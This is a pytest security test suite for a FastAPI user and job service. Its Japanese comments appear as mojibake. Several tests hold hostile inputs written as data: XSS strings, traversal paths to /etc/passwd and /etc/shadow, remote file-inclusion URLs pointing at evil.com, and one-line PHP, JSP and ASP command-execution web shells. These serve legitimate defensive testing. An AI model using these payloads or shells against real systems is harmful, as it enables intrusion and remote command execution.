"""
General Security Vulnerability Tests

ä¸€èˆ¬çš„ãªã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£è„†å¼±æ€§ãƒ†ã‚¹ãƒˆã‚¹ã‚¤ãƒ¼ãƒˆ
- XSS (Cross-Site Scripting) é˜²æ­¢
- CSRF ãƒˆãƒ¼ã‚¯ãƒ³æ¤œè¨¼
- ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ˜ãƒƒãƒ€ãƒ¼ (CSP, HSTS, etc.)
- ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªãƒˆãƒ©ãƒãƒ¼ã‚µãƒ«é˜²æ­¢
- ãƒ•ã‚¡ã‚¤ãƒ«ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£
- ãƒ¬ãƒ¼ãƒˆåˆ¶é™å®Ÿè£…
- ã™ã¹ã¦ã®ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã®å…¥åŠ›æ¤œè¨¼
"""

import pytest
import pytest_asyncio
from httpx import AsyncClient
from fastapi import status
import time
import asyncio
from unittest.mock import patch, MagicMock
import re
import os
import tempfile
from typing import Dict, List, Any
import xml.etree.ElementTree as ET


class TestXSSPrevention:
    """XSS (Cross-Site Scripting) é˜²æ­¢ãƒ†ã‚¹ãƒˆ"""

    @pytest.mark.asyncio
    async def test_reflected_xss_prevention(self, async_client: AsyncClient):
        """åå°„å‹XSSé˜²æ­¢ãƒ†ã‚¹ãƒˆ"""
        xss_payloads = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "<svg onload=alert('xss')>",
            "javascript:alert('xss')",
            "<iframe src=javascript:alert('xss')></iframe>",
            "'><script>alert('xss')</script>",
            "\"><script>alert('xss')</script>",
            "<scr<script>ipt>alert('xss')</script>",
            "%3Cscript%3Ealert('xss')%3C/script%3E",
            "&lt;script&gt;alert('xss')&lt;/script&gt;",
        ]

        endpoints_to_test = [
            "/users/?name={}",
            "/jobs/?title={}",
            "/users/?email={}",
            "/jobs/?company={}",
        ]

        for endpoint_template in endpoints_to_test:
            for payload in xss_payloads:
                endpoint = endpoint_template.format(payload)
                response = await async_client.get(endpoint)

                # Check that XSS payload is not reflected in response
                response_text = response.text

                # Should not contain unescaped script tags
                assert "<script>" not in response_text.lower(), f"XSS payload reflected: {payload}"
                assert "javascript:" not in response_text.lower(), f"JavaScript URL reflected: {payload}"
                assert "onerror=" not in response_text.lower(), f"Event handler reflected: {payload}"
                assert "onload=" not in response_text.lower(), f"Event handler reflected: {payload}"

                # Check that payload is properly escaped
                if payload in response_text:
                    # If payload appears, it should be escaped
                    assert "&lt;script&gt;" in response_text or payload not in response_text

    @pytest.mark.asyncio
    async def test_stored_xss_prevention(self, async_client: AsyncClient):
        """æ ¼ç´å‹XSSé˜²æ­¢ãƒ†ã‚¹ãƒˆ"""
        xss_payload = "<script>alert('stored_xss')</script>"

        # Try to store XSS payload in user profile
        user_data = {
            "email": "xss_test@example.com",
            "name": xss_payload,
            "age_group": "20ä»£å‰åŠ",
            "location": "æ±äº¬éƒ½"
        }

        # Create user with malicious data
        response = await async_client.post("/users/", json=user_data)

        if response.status_code == 201:
            user_id = response.json()["id"]

            # Retrieve user data
            response = await async_client.get(f"/users/{user_id}")

            if response.status_code == 200:
                user_data = response.json()
                name = user_data.get("name", "")

                # XSS payload should be escaped or sanitized
                assert "<script>" not in name, "Stored XSS payload not escaped"
                assert "alert(" not in name, "JavaScript code not sanitized"

    @pytest.mark.asyncio
    async def test_dom_xss_prevention(self, async_client: AsyncClient):
        """DOMå‹XSSé˜²æ­¢ãƒ†ã‚¹ãƒˆ"""
        # Test client-side XSS prevention (would require frontend testing)
        dom_xss_payloads = [
            "#<script>alert('dom_xss')</script>",
            "#javascript:alert('dom_xss')",
            "#<img src=x onerror=alert('dom_xss')>",
        ]

        # Test that these payloads don't cause issues in API responses
        for payload in dom_xss_payloads:
            response = await async_client.get(f"/users/?search={payload}")

            # Should handle safely
            assert response.status_code in [200, 400, 422]

            if response.status_code == 200:
                # Should not reflect dangerous content
                assert "javascript:" not in response.text.lower()
                assert "<script>" not in response.text.lower()


class TestCSRFProtection:
    """CSRF (Cross-Site Request Forgery) é˜²æ­¢ãƒ†ã‚¹ãƒˆ"""

    @pytest.mark.asyncio
    async def test_csrf_token_requirement(self, async_client: AsyncClient):
        """CSRF ãƒˆãƒ¼ã‚¯ãƒ³è¦ä»¶ãƒ†ã‚¹ãƒˆ"""
        # Test that state-changing operations require CSRF tokens
        state_changing_endpoints = [
            {"method": "POST", "path": "/users/", "data": {"email": "test@example.com"}},
            {"method": "PUT", "path": "/users/1", "data": {"name": "Updated Name"}},
            {"method": "DELETE", "path": "/users/1"},
            {"method": "POST", "path": "/jobs/", "data": {"title": "Test Job"}},
        ]

        for endpoint in state_changing_endpoints:
            # Make request without CSRF token
            if endpoint["method"] == "POST":
                response = await async_client.post(endpoint["path"], json=endpoint.get("data", {}))
            elif endpoint["method"] == "PUT":
                response = await async_client.put(endpoint["path"], json=endpoint.get("data", {}))
            elif endpoint["method"] == "DELETE":
                response = await async_client.delete(endpoint["path"])

            # Should reject requests without CSRF token (in production)
            # During development, this might be disabled
            if response.status_code == status.HTTP_403_FORBIDDEN:
                assert "csrf" in response.text.lower() or "forbidden" in response.text.lower()

    @pytest.mark.asyncio
    async def test_csrf_token_validation(self, async_client: AsyncClient):
        """CSRF ãƒˆãƒ¼ã‚¯ãƒ³æ¤œè¨¼ãƒ†ã‚¹ãƒˆ"""
        # Get CSRF token
        response = await async_client.get("/csrf-token")

        if response.status_code == 200:
            token_data = response.json()
            csrf_token = token_data.get("csrf_token")

            # Make request with valid CSRF token
            headers = {"X-CSRF-Token": csrf_token}
            response = await async_client.post(
                "/users/",
                json={"email": "csrf_test@example.com", "name": "CSRF Test"},
                headers=headers
            )

            # Should be accepted
            assert response.status_code in [200, 201, 401]  # 401 if auth required

            # Test with invalid CSRF token
            headers = {"X-CSRF-Token": "invalid_token"}
            response = await async_client.post(
                "/users/",
                json={"email": "csrf_test2@example.com", "name": "CSRF Test 2"},
                headers=headers
            )

            # Should be rejected if CSRF is enforced
            if response.status_code == 403:
                assert True  # CSRF protection working
            else:
                # CSRF might be disabled in development
                pass

    @pytest.mark.asyncio
    async def test_same_site_cookie_protection(self, async_client: AsyncClient):
        """SameSite ã‚¯ãƒƒã‚­ãƒ¼ä¿è­·ãƒ†ã‚¹ãƒˆ"""
        # Login to get session cookie
        login_data = {"email": "test@example.com", "password": "ValidPassword123!"}
        response = await async_client.post("/auth/login", json=login_data)

        if response.status_code == 200:
            # Check cookie attributes
            set_cookie_headers = response.headers.get_list("set-cookie")

            for cookie_header in set_cookie_headers:
                if "session" in cookie_header.lower():
                    # Should have SameSite attribute
                    assert "SameSite=" in cookie_header, "Session cookie missing SameSite attribute"

                    # Should use Strict or Lax
                    assert any(x in cookie_header for x in ["SameSite=Strict", "SameSite=Lax"]), \
                        "SameSite attribute should be Strict or Lax"

                    # Should be Secure in production
                    if "Secure" in cookie_header:
                        assert True  # Good - Secure flag set


class TestSecurityHeaders:
    """ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ˜ãƒƒãƒ€ãƒ¼ãƒ†ã‚¹ãƒˆ"""

    @pytest.mark.asyncio
    async def test_content_security_policy(self, async_client: AsyncClient):
        """Content Security Policy ãƒ†ã‚¹ãƒˆ"""
        response = await async_client.get("/")

        csp_header = response.headers.get("content-security-policy")
        if csp_header:
            # Should have restrictive CSP
            assert "default-src" in csp_header, "CSP missing default-src directive"

            # Should not allow unsafe-inline or unsafe-eval
            assert "unsafe-inline" not in csp_header, "CSP allows unsafe-inline"
            assert "unsafe-eval" not in csp_header, "CSP allows unsafe-eval"

            # Should be restrictive
            if "'self'" in csp_header:
                assert True  # Good - restricts to same origin
            elif "'none'" in csp_header:
                assert True  # Even better - very restrictive

    @pytest.mark.asyncio
    async def test_x_frame_options(self, async_client: AsyncClient):
        """X-Frame-Options ãƒ†ã‚¹ãƒˆ"""
        response = await async_client.get("/")

        x_frame_options = response.headers.get("x-frame-options")
        assert x_frame_options is not None, "Missing X-Frame-Options header"
        assert x_frame_options.upper() in ["DENY", "SAMEORIGIN"], f"Insecure X-Frame-Options: {x_frame_options}"

    @pytest.mark.asyncio
    async def test_x_content_type_options(self, async_client: AsyncClient):
        """X-Content-Type-Options ãƒ†ã‚¹ãƒˆ"""
        response = await async_client.get("/")

        x_content_type = response.headers.get("x-content-type-options")
        assert x_content_type is not None, "Missing X-Content-Type-Options header"
        assert x_content_type.lower() == "nosniff", f"Invalid X-Content-Type-Options: {x_content_type}"

    @pytest.mark.asyncio
    async def test_referrer_policy(self, async_client: AsyncClient):
        """Referrer Policy ãƒ†ã‚¹ãƒˆ"""
        response = await async_client.get("/")

        referrer_policy = response.headers.get("referrer-policy")
        if referrer_policy:
            secure_policies = [
                "no-referrer",
                "no-referrer-when-downgrade",
                "strict-origin",
                "strict-origin-when-cross-origin"
            ]
            assert any(policy in referrer_policy for policy in secure_policies), \
                f"Insecure referrer policy: {referrer_policy}"

    @pytest.mark.asyncio
    async def test_permissions_policy(self, async_client: AsyncClient):
        """Permissions Policy ãƒ†ã‚¹ãƒˆ"""
        response = await async_client.get("/")

        permissions_policy = response.headers.get("permissions-policy")
        if permissions_policy:
            # Should restrict dangerous features
            dangerous_features = ["camera", "microphone", "geolocation", "payment"]

            for feature in dangerous_features:
                if feature in permissions_policy:
                    # Should be restricted
                    assert f"{feature}=()" in permissions_policy, \
                        f"Feature {feature} not properly restricted"


class TestDirectoryTraversal:
    """ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªãƒˆãƒ©ãƒãƒ¼ã‚µãƒ«é˜²æ­¢ãƒ†ã‚¹ãƒˆ"""

    @pytest.mark.asyncio
    async def test_path_traversal_prevention(self, async_client: AsyncClient):
        """ãƒ‘ã‚¹ãƒˆãƒ©ãƒãƒ¼ã‚µãƒ«é˜²æ­¢ãƒ†ã‚¹ãƒˆ"""
        path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//....//etc/passwd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "../../../etc/shadow",
            "../../windows/win.ini",
            "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        ]

        # Test file serving endpoints (if any)
        endpoints_to_test = [
            "/files/{}",
            "/uploads/{}",
            "/static/{}",
            "/download/{}",
        ]

        for endpoint_template in endpoints_to_test:
            for payload in path_traversal_payloads:
                endpoint = endpoint_template.format(payload)
                response = await async_client.get(endpoint)

                # Should not allow access to sensitive files
                if response.status_code == 200:
                    content = response.text.lower()

                    # Check that sensitive file contents are not returned
                    sensitive_content = [
                        "root:", "password", "shadow", "sam",
                        "[fonts]", "for 16-bit app", "system.ini"
                    ]

                    for sensitive in sensitive_content:
                        assert sensitive not in content, \
                            f"Directory traversal successful: {payload}"

                # Should return 404, 403, or 400 for invalid paths
                assert response.status_code in [404, 403, 400, 422], \
                    f"Unexpected response for path traversal: {response.status_code}"

    @pytest.mark.asyncio
    async def test_file_inclusion_prevention(self, async_client: AsyncClient):
        """ãƒ•ã‚¡ã‚¤ãƒ«ã‚¤ãƒ³ã‚¯ãƒ«ãƒ¼ã‚¸ãƒ§ãƒ³é˜²æ­¢ãƒ†ã‚¹ãƒˆ"""
        file_inclusion_payloads = [
            "php://input",
            "php://filter/convert.base64-encode/resource=index.php",
            "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
            "file:///etc/passwd",
            "http://evil.com/shell.txt",
            "ftp://evil.com/shell.txt",
        ]

        # Test template or include parameters (if any)
        for payload in file_inclusion_payloads:
            response = await async_client.get(f"/template?file={payload}")

            # Should not allow file inclusion
            assert response.status_code in [404, 403, 400, 422], \
                f"File inclusion possible: {payload}"

            if response.status_code == 200:
                # Should not contain PHP code or sensitive file content
                content = response.text.lower()
                assert "<?php" not in content, "PHP code inclusion detected"
                assert "root:" not in content, "Sensitive file accessed"


class TestFileUploadSecurity:
    """ãƒ•ã‚¡ã‚¤ãƒ«ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ†ã‚¹ãƒˆ"""

    @pytest.mark.asyncio
    async def test_malicious_file_upload_prevention(self, async_client: AsyncClient):
        """æ‚ªæ„ã®ã‚ã‚‹ãƒ•ã‚¡ã‚¤ãƒ«ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰é˜²æ­¢ãƒ†ã‚¹ãƒˆ"""
        # Create malicious files for testing
        malicious_files = {
            "shell.php": b"<?php system($_GET['cmd']); ?>",
            "shell.jsp": b"<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>",
            "shell.asp": b"<% eval request(\"cmd\") %>",
            "malware.exe": b"\x4d\x5a\x90\x00",  # PE header
            "script.js": b"alert('xss');",
            "malicious.html": b"<script>alert('xss')</script>",
        }

        for filename, content in malicious_files.items():
            with tempfile.NamedTemporaryFile(suffix=f"_{filename}", delete=False) as tmp:
                tmp.write(content)
                tmp.flush()

                try:
                    files = {"file": (filename, content, "application/octet-stream")}
                    response = await async_client.post("/upload", files=files)

                    # Should reject dangerous file types
                    if filename.endswith(('.php', '.jsp', '.asp', '.exe')):
                        assert response.status_code in [400, 403, 415, 422], \
                            f"Dangerous file type accepted: {filename}"

                    # Should not return 500 error (proper validation)
                    assert response.status_code != 500, "Server error on malicious file upload"

                finally:
                    os.unlink(tmp.name)

    @pytest.mark.asyncio
    async def test_file_size_limits(self, async_client: AsyncClient):
        """ãƒ•ã‚¡ã‚¤ãƒ«ã‚µã‚¤ã‚ºåˆ¶é™ãƒ†ã‚¹ãƒˆ"""
        # Create large file
        large_content = b"A" * (10 * 1024 * 1024)  # 10MB

        files = {"file": ("large_file.txt", large_content, "text/plain")}
        response = await async_client.post("/upload", files=files)

        # Should reject files that are too large
        assert response.status_code in [413, 400, 422], "Large file not rejected"

    @pytest.mark.asyncio
    async def test_filename_sanitization(self, async_client: AsyncClient):
        """ãƒ•ã‚¡ã‚¤ãƒ«åã‚µãƒ‹ã‚¿ã‚¤ã‚¼ãƒ¼ã‚·ãƒ§ãƒ³ãƒ†ã‚¹ãƒˆ"""
        dangerous_filenames = [
            "../../../etc/passwd",
            "shell.php",
            "<script>alert('xss')</script>.txt",
            "file with spaces and special chars!@#$.txt",
            "very_long_filename_" + "a" * 200 + ".txt",
            "file\x00.txt",  # Null byte injection
            "CON.txt",  # Windows reserved name
            "NUL.txt",  # Windows reserved name
        ]

        for dangerous_name in dangerous_filenames:
            files = {"file": (dangerous_name, b"test content", "text/plain")}
            response = await async_client.post("/upload", files=files)

            if response.status_code == 200:
                # If upload succeeds, filename should be sanitized
                response_data = response.json()
                stored_filename = response_data.get("filename", "")

                # Should not contain dangerous characters
                assert "../" not in stored_filename, "Path traversal in filename"
                assert "<script>" not in stored_filename, "XSS in filename"
                assert "\x00" not in stored_filename, "Null byte in filename"

                # Should not use reserved Windows names
                assert stored_filename.upper() not in ["CON.TXT", "NUL.TXT"], \
                    "Reserved filename used"

    @pytest.mark.asyncio
    async def test_file_content_validation(self, async_client: AsyncClient):
        """ãƒ•ã‚¡ã‚¤ãƒ«å†…å®¹æ¤œè¨¼ãƒ†ã‚¹ãƒˆ"""
        # Test file with mismatched extension and content
        fake_image = b"<?php echo 'fake image'; ?>"
        files = {"file": ("image.jpg", fake_image, "image/jpeg")}

        response = await async_client.post("/upload", files=files)

        # Should validate file content matches extension
        if response.status_code == 200:
            # File should be properly validated
            # (Real implementation would check magic bytes)
            pass
        else:
            # Rejection is also acceptable for security
            assert response.status_code in [400, 415, 422], "Invalid file content check"


class TestRateLimiting:
    """ãƒ¬ãƒ¼ãƒˆåˆ¶é™ãƒ†ã‚¹ãƒˆ"""

    @pytest.mark.asyncio
    async def test_api_rate_limiting(self, async_client: AsyncClient):
        """API ãƒ¬ãƒ¼ãƒˆåˆ¶é™ãƒ†ã‚¹ãƒˆ"""
        endpoint = "/users/"
        rate_limit_test_count = 100

        responses = []
        start_time = time.time()

        # Make many requests quickly
        for i in range(rate_limit_test_count):
            response = await async_client.get(endpoint)
            responses.append(response.status_code)

            # If rate limited, should get 429
            if response.status_code == 429:
                break

        end_time = time.time()

        # Should implement rate limiting
        rate_limited_count = sum(1 for status in responses if status == 429)

        if rate_limited_count > 0:
            assert True  # Rate limiting is working
        else:
            # If no rate limiting detected, requests should be processed normally
            successful_requests = sum(1 for status in responses if status == 200)
            assert successful_requests > 0, "No successful requests processed"

    @pytest.mark.asyncio
    async def test_per_user_rate_limiting(self, async_client: AsyncClient):
        """ãƒ¦ãƒ¼ã‚¶ãƒ¼åˆ¥ãƒ¬ãƒ¼ãƒˆåˆ¶é™ãƒ†ã‚¹ãƒˆ"""
        # This would require authentication setup
        # Test that each user has individual rate limits

        # Make requests with different user tokens
        users = ["user1@example.com", "user2@example.com"]

        for user_email in users:
            # Get user token (simplified)
            token = await self._get_user_token(async_client, user_email)

            if token:
                headers = {"Authorization": f"Bearer {token}"}

                # Make many requests as this user
                for i in range(50):
                    response = await async_client.get("/users/profile", headers=headers)

                    if response.status_code == 429:
                        # Rate limit reached for this user
                        break

    async def _get_user_token(self, async_client: AsyncClient, email: str):
        """Helper: Get user authentication token"""
        login_data = {"email": email, "password": "ValidPassword123!"}
        response = await async_client.post("/auth/login", json=login_data)

        if response.status_code == 200:
            return response.json().get("access_token")
        return None

    @pytest.mark.asyncio
    async def test_ddos_protection(self, async_client: AsyncClient):
        """DDoS é˜²å¾¡ãƒ†ã‚¹ãƒˆ"""
        # Test that the system can handle burst requests
        concurrent_requests = 20

        async def make_request():
            return await async_client.get("/health")

        # Make concurrent requests
        start_time = time.time()
        tasks = [make_request() for _ in range(concurrent_requests)]
        responses = await asyncio.gather(*tasks, return_exceptions=True)
        end_time = time.time()

        # Should handle concurrent requests gracefully
        successful_responses = 0
        rate_limited_responses = 0

        for response in responses:
            if hasattr(response, 'status_code'):
                if response.status_code == 200:
                    successful_responses += 1
                elif response.status_code == 429:
                    rate_limited_responses += 1

        # Should either handle all requests or rate limit some
        assert successful_responses > 0 or rate_limited_responses > 0, \
            "System failed to handle concurrent requests"

        # Response time should be reasonable even under load
        avg_response_time = (end_time - start_time) / concurrent_requests
        assert avg_response_time < 10.0, f"Response time too slow under load: {avg_response_time}s"


class TestInputValidation:
    """å…¥åŠ›æ¤œè¨¼ãƒ†ã‚¹ãƒˆ"""

    @pytest.mark.asyncio
    async def test_email_validation(self, async_client: AsyncClient):
        """ãƒ¡ãƒ¼ãƒ«ã‚¢ãƒ‰ãƒ¬ã‚¹æ¤œè¨¼ãƒ†ã‚¹ãƒˆ"""
        invalid_emails = [
            "invalid_email",
            "@domain.com",
            "user@",
            "user@domain",
            "user..double@domain.com",
            "user@domain..double.com",
            "user with space@domain.com",
            "user@domain.com.",
            ".user@domain.com",
            "user@-domain.com",
            "user@domain-.com",
        ]

        for email in invalid_emails:
            user_data = {
                "email": email,
                "name": "Test User",
                "age_group": "20ä»£å‰åŠ"
            }

            response = await async_client.post("/users/", json=user_data)

            # Should reject invalid emails
            assert response.status_code in [400, 422], f"Invalid email accepted: {email}"

    @pytest.mark.asyncio
    async def test_input_length_validation(self, async_client: AsyncClient):
        """å…¥åŠ›é•·æ¤œè¨¼ãƒ†ã‚¹ãƒˆ"""
        # Test various field length limits
        test_cases = [
            {"field": "name", "max_length": 100},
            {"field": "email", "max_length": 254},
            {"field": "location", "max_length": 100},
        ]

        for case in test_cases:
            field = case["field"]
            max_length = case["max_length"]

            # Create data with field too long
            long_value = "A" * (max_length + 1)
            user_data = {
                "email": "test@example.com",
                "name": "Test User",
                "age_group": "20ä»£å‰åŠ",
                "location": "æ±äº¬éƒ½"
            }
            user_data[field] = long_value

            response = await async_client.post("/users/", json=user_data)

            # Should reject data that's too long
            assert response.status_code in [400, 422], \
                f"Overlong {field} accepted: {len(long_value)} chars"

    @pytest.mark.asyncio
    async def test_special_character_handling(self, async_client: AsyncClient):
        """ç‰¹æ®Šæ–‡å­—å‡¦ç†ãƒ†ã‚¹ãƒˆ"""
        special_chars_data = {
            "email": "test+special@example-domain.com",
            "name": "åå‰ with ã‚¹ãƒšãƒ¼ã‚¹ & ç‰¹æ®Šæ–‡å­—!@#$%",
            "age_group": "20ä»£å‰åŠ",
            "location": "æ±äº¬éƒ½ãƒ»æ¸‹è°·åŒº"
        }

        response = await async_client.post("/users/", json=special_chars_data)

        # Should handle special characters properly
        if response.status_code == 201:
            user_data = response.json()
            # Special characters should be preserved or properly encoded
            assert len(user_data["name"]) > 0, "Name with special chars was empty"

    @pytest.mark.asyncio
    async def test_unicode_input_handling(self, async_client: AsyncClient):
        """Unicode å…¥åŠ›å‡¦ç†ãƒ†ã‚¹ãƒˆ"""
        unicode_data = {
            "email": "test@example.com",
            "name": "ãƒ†ã‚¹ãƒˆ ãƒ¦ãƒ¼ã‚¶ãƒ¼ æµ‹è¯•ç”¨æˆ· ğŸš€",
            "age_group": "20ä»£å‰åŠ",
            "location": "æ±äº¬éƒ½"
        }

        response = await async_client.post("/users/", json=unicode_data)

        # Should handle Unicode properly
        if response.status_code == 201:
            user_data = response.json()
            assert "ãƒ†ã‚¹ãƒˆ" in user_data["name"], "Unicode characters not preserved"

    @pytest.mark.asyncio
    async def test_null_byte_injection_prevention(self, async_client: AsyncClient):
        """NULL ãƒã‚¤ãƒˆã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³é˜²æ­¢ãƒ†ã‚¹ãƒˆ"""
        null_byte_data = {
            "email": "test\x00@example.com",
            "name": "Test\x00User",
            "age_group": "20ä»£å‰åŠ",
            "location": "æ±äº¬éƒ½\x00"
        }

        response = await async_client.post("/users/", json=null_byte_data)

        # Should reject or sanitize null bytes
        assert response.status_code in [400, 422, 201], "Null byte handling check"

        if response.status_code == 201:
            user_data = response.json()
            # Null bytes should be removed
            assert "\x00" not in user_data["name"], "Null byte not removed"
            assert "\x00" not in user_data["email"], "Null byte not removed"


if __name__ == "__main__":
    pytest.main([__file__, "-v"])